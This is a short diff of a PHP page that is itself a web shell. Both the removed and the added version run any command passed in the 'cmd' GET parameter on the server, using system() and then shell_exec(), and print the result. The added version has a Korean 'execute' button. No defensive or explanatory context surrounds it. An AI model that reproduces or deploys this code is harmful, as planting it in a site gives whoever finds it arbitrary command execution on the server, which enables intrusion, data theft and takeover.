@@ -1,16 +1,15 @@
+<?php
+if(isset($_GET['cmd'])){
+    $result = shell_exec($_GET['cmd']);
+}
+?>
+<!DOCTYPE html>
 <html>
 <body>
-<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
-<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
-<input type="SUBMIT" value="Execute">
+<form method="GET">
+    <input type="text" name="cmd" style="width:300px">
+    <input type="submit" value="실행">
 </form>
-<pre>
-<?php
-    if(isset($_GET['cmd']))
-    {
-        system($_GET['cmd']);
-    }
-?>
-</pre>
+<pre><?php echo isset($result) ? $result : ''; ?></pre>
 </body>
 </html>
